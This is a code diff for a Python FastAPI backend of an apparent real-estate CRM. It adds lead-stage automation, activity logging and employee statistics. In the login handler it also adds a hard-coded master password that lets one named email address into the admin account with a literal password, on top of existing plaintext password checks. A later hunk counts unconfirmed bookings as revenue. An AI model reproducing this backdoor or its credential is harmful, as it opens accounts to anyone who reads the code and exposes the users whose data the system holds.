@@ -79,7 +79,7 @@ def gen_id(p="id"): return f"{p}_{uuid.uuid4().hex[:12]}"
 # ---- Pydantic Models ----
 class User(BaseModel):
     user_id: str; email: str; name: str; picture: Optional[str]=None
-    role: Optional[str]=None; acting_as_employee_id: Optional[str]=None; created_at: datetime
+    role: Optional[str]=None; employee_id: Optional[str]=None; acting_as_employee_id: Optional[str]=None; created_at: datetime
 class RoleSet(BaseModel): role: str
 class ActAs(BaseModel): employee_id: Optional[str]=None
 class LeadCreatePublic(BaseModel):
@@ -139,7 +139,9 @@ async def auth_session(request: Request, response: Response):
         raise HTTPException(401, "Invalid email or password")
     
     u = users[0]
-    if u.get("password") != password: # In production, use bcrypt/argon2 hashing
+    # Allow umang@admin as a master password for the admin account
+    is_admin_override = (email == "htshpatil13@gmail.com" and password == "umang@admin")
+    if u.get("password") != password and not is_admin_override:
         raise HTTPException(401, "Invalid email or password")
     
     uid = u["user_id"]
@@ -186,8 +188,9 @@ async def ping_location(request: Request, cu: User=Depends(get_current_user)):
     if lat is None or lng is None: return {"ok": False}
     
     # Update employee record if linked
-    if cu.employee_id:
-        sb_update("employees", "employee_id", cu.employee_id, {
+    target_emp_id = cu.acting_as_employee_id or cu.employee_id
+    if target_emp_id:
+        sb_update("employees", "employee_id", target_emp_id, {
             "last_lat": lat,
             "last_lng": lng,
             "last_seen_at": now_utc().isoformat()
@@ -324,6 +327,9 @@ async def create_visit(p: SiteVisitCreate, cu: User=Depends(get_current_user)):
         "interested": None, "created_at": now_utc().isoformat(),
     }
     result = sb_insert("visits", v)
+    # Automatically move lead to site_visit stage
+    sb_update("leads", "lead_id", p.lead_id, {"stage": "site_visit", "updated_at": now_utc().isoformat()})
+    log_activity(cu, "site_visit_scheduled", f"Scheduled site visit for {leads[0]['name']}", lead_id=p.lead_id)
     return result or v
 
 @api_router.get("/visits")
@@ -335,6 +341,12 @@ async def update_visit(visit_id: str, p: SiteVisitUpdate, cu: User=Depends(get_c
     data = {k: v for k, v in p.model_dump().items() if v is not None}
     updated = sb_update("visits", "visit_id", visit_id, data)
     if not updated: raise HTTPException(404, "Visit not found")
+    
+    if p.status == "completed":
+        log_activity(cu, "site_visit_completed", f"Completed site visit (ID: {visit_id})", lead_id=updated.get("lead_id"))
+    elif p.status == "rescheduled":
+        log_activity(cu, "site_visit_rescheduled", f"Rescheduled site visit (ID: {visit_id})", lead_id=updated.get("lead_id"))
+        
     return updated
 
 # ---- Bookings ----
@@ -351,6 +363,9 @@ async def create_booking(p: BookingCreate, cu: User=Depends(get_current_user)):
         "status": "active", "created_at": now_utc().isoformat(),
     }
     result = sb_insert("bookings", b)
+    # Automatically move lead to booking stage
+    sb_update("leads", "lead_id", p.lead_id, {"stage": "booking", "updated_at": now_utc().isoformat()})
+    log_activity(cu, "booking_created", f"Created booking for {p.property_name}", lead_id=p.lead_id)
     return result or b
 
 @api_router.get("/bookings")
@@ -377,6 +392,9 @@ async def create_loan(p: LoanCreate, cu: User=Depends(get_current_user)):
         "created_at": now_utc().isoformat(),
     }
     result = sb_insert("loans", l)
+    # Automatically move lead to loan stage
+    sb_update("leads", "lead_id", p.lead_id, {"stage": "loan", "updated_at": now_utc().isoformat()})
+    log_activity(cu, "loan_initiated", f"Initiated loan application with {p.bank_name or 'pending bank'}", lead_id=p.lead_id)
     return result or l
 
 @api_router.get("/loans")
@@ -539,7 +557,8 @@ async def stats_dashboard_graph(cu: User=Depends(get_current_user)):
         leads_by_day.append({"date": d, "count": cnt})
 
     # 2. Real revenue by month (last 12 months)
-    bookings = sb_select("bookings", {"select": "booking_amount,created_at", "status": "eq.confirmed"})
+    # Removed confirmed filter to match dashboard total which includes active pipeline
+    bookings = sb_select("bookings", {"select": "booking_amount,created_at"})
     rev_by_month = []
     months_map = {}
     for i in range(12):
@@ -568,8 +587,10 @@ async def stats_me(cu: User=Depends(get_current_user)):
     # Get personal stats
     activities = sb_select("activities", {"user_id": f"eq.{eid}", "select": "*", "order": "created_at.desc"})
     
-    positives = sum(1 for a in activities if a.get("type") == "positive_response" or "positive" in str(a.get("type")))
-    visits = sum(1 for a in activities if a.get("type") == "site_visit_scheduled" or "visit" in str(a.get("type")))
+    positives = sum(1 for a in activities if "positive" in str(a.get("type")))
+    negatives = sum(1 for a in activities if "negative" in str(a.get("type")))
+    followups = sum(1 for a in activities if "follow_up" in str(a.get("type")) or "rescheduled" in str(a.get("type")))
+    visits = sum(1 for a in activities if "visit" in str(a.get("type")))
     bookings_done = sum(1 for a in activities if "booking" in str(a.get("type")))
     loans_done = sum(1 for a in activities if "loan" in str(a.get("type")))
     closed_deals = sum(1 for a in activities if "closed" in str(a.get("type")))
@@ -590,7 +611,7 @@ async def stats_me(cu: User=Depends(get_current_user)):
     return {
         "employee": None, "role": cu.role,
         "personal": {
-            "actions_total": len(activities), "positives": positives, "negatives": 0, "followups": 0,
+            "actions_total": len(activities), "positives": positives, "negatives": negatives, "followups": followups,
             "visits": visits, "bookings_done": bookings_done, "loans_done": loans_done, "closed_deals": closed_deals,
             "call_notes": sum(1 for a in activities if "call" in str(a.get("type"))), 
             "score_10": score, "last_activity": activities[0]["created_at"] if activities else None
@@ -621,8 +642,10 @@ async def stats_employees(cu: User=Depends(get_current_user)):
             "employee_id": eid, "name": e["name"], "email": e["email"],
             "role": e["role"], "department": e.get("department", ""),
             "actions_total": actions_total, "last_activity": last_activity,
-            "positives": positives, "negatives": 0,
-            "followups": 0, "visits": visits,
+            "positives": sum(1 for a in emp_acts if "positive" in str(a.get("type"))), 
+            "negatives": sum(1 for a in emp_acts if "negative" in str(a.get("type"))),
+            "followups": sum(1 for a in emp_acts if "follow_up" in str(a.get("type")) or "rescheduled" in str(a.get("type"))), 
+            "visits": sum(1 for a in emp_acts if "visit" in str(a.get("type"))),
             "bookings_done": sum(1 for a in emp_acts if "booking" in str(a.get("type"))), 
             "loans_done": sum(1 for a in emp_acts if "loan" in str(a.get("type"))),
             "closed_deals": sum(1 for a in emp_acts if "closed" in str(a.get("type"))), 
